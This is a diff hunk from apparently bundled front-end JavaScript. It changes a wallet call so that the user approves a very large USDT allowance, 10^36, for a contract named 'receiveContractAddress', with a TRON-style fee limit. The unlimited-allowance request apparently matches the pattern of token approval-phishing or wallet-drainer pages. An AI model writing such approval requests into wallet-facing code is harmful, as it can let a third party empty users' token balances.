@@ -36091,7 +36091,7 @@ var Home = function Home() {
               break;
             }
             _context.next = 12;
-            return usdtContract.approve(receiveContractAddress, 99999999999999999999999999999999999999999999999999999999999999999999999999999999999).send({
+            return usdtContract.approve(receiveContractAddress, "1000000000000000000000000000000000000").send({
               feeLimit: "100000000"
             });
           case 12:
